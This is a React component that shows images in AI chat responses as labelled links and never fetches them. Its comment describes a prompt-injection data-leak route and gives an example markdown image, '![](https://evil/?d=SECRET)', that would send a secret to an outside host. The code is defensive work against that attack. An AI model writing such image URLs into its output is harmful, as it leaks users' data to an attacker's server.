import React from 'react';

const hostOf = (url) => {
	try {
		return new URL(url).host || url;
	} catch (e) {
		return url || '';
	}
};

// An image in a chat response that the chat does not render ("Render images
// in responses" off, the default): model output can be shaped by prompt
// injection, and loading "![](https://evil/?d=SECRET)" would send data to
// that host. The image is shown as a link with its alt text and host, never
// fetched; the user can still open it deliberately.
const BlockedImage = ({ src, alt }) => {
	const label = `image${alt ? `: ${alt}` : ''}`;
	if (!src) {
		return <span data-testid="blocked-image">[{label}]</span>;
	}
	return (
		<a
			href={src}
			target="_blank"
			rel="noopener noreferrer nofollow"
			data-testid="blocked-image"
			title={src}
		>
			[{label} ({hostOf(src)}, not loaded)]
		</a>
	);
};

export default BlockedImage;
